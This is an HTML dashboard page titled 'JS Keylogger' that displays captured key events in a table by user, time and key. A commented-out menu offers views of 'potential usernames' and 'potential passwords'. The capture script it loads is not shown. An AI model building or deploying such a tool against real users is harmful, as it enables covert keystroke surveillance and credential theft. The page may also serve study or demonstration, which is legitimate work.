<!DOCTYPE html>
<html>
    <head>
        <title>JS Keylogger</title>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="./static/js_keylog.js"></script>

        <!-- To get rid of favicon.ico errors -->
        <link rel="icon" href="data:,">
        <h1>Hello there!</h1>
        <nav>
          <b>Keypresses</b>
          <ul>
            <li data-displays="keylogView">View all key events</li>
          </ul>
          <!-- <b>Words</b>
          <ul>
            <li data-displays="words">View words typed</li>
            <li data-displays="username">View potential usernames</li>
            <li data-displays="password">View potential passwords</li>
          </ul> -->
        </nav>
    </head>
  <body>
    <div id="keylogView" class="table-responsive">
      <h2>View all key events</h2>
      <div class="alert alert-success" id="showKeyTable" style="visibility: hidden"></div>
      <table class="table table-striped table-bordered">
          <thead>
              <tr>
                  <th>User</th>
                  <th>time (Epoch)</th>
                  <th>isKeyDown</th>
                  <th>key</th>
              </tr>
          </thead>
          <tbody>
          </tbody>
      </table>
  </div>
</html>
